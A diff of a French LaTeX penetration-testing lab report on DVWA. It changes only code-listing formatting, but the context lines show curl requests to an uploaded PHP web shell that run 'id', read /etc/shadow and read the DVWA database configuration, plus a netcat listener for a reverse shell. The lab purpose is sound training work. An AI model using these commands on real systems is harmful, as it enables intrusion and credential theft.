@@ -186,7 +186,9 @@
 	frame=single,
 	rulecolor=\color{primary},
 	breaklines=true,
-	breakatwhitespace=true,
+	breakatwhitespace=false,
+	prebreak=\raisebox{0ex}[0ex][0ex]{\ensuremath{\hookleftarrow\space}},
+	postbreak=\raisebox{0ex}[0ex][0ex]{\ensuremath{\space\hookrightarrow}},
 	showstringspaces=false,
 	captionpos=b,
 	numbers=left,
@@ -5554,7 +5556,7 @@ if(isset($_GET['cmd'])) {
 
 Une fois uploadé, le web shell est accessible via :
 
-\begin{lstlisting}[caption=Utilisation du web shell via HTTP]
+\begin{lstlisting}[caption=Utilisation du web shell via HTTP,basicstyle=\ttfamily\footnotesize]
 # Vérification de l'accès
 curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=id"
 # Résultat attendu : uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -5571,7 +5573,7 @@ curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/shadow"
 
 \subsubsection{Établissement d'un Reverse Shell}
 
-\begin{lstlisting}[caption=Reverse shell depuis le web shell]
+\begin{lstlisting}[caption=Reverse shell depuis le web shell,basicstyle=\ttfamily\footnotesize]
 # Sur l'attaquant (Parrot Security)
 nc -lvnp 4444
 
@@ -5590,7 +5592,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 DVWA stocke sa configuration de base de données dans un fichier PHP lisible par le processus web :
 
-\begin{lstlisting}[caption=Extraction de la configuration DVWA]
+\begin{lstlisting}[caption=Extraction de la configuration DVWA,basicstyle=\ttfamily\footnotesize]
 # Via web shell
 curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/var/www/html/dvwa/config/config.inc.php"
 
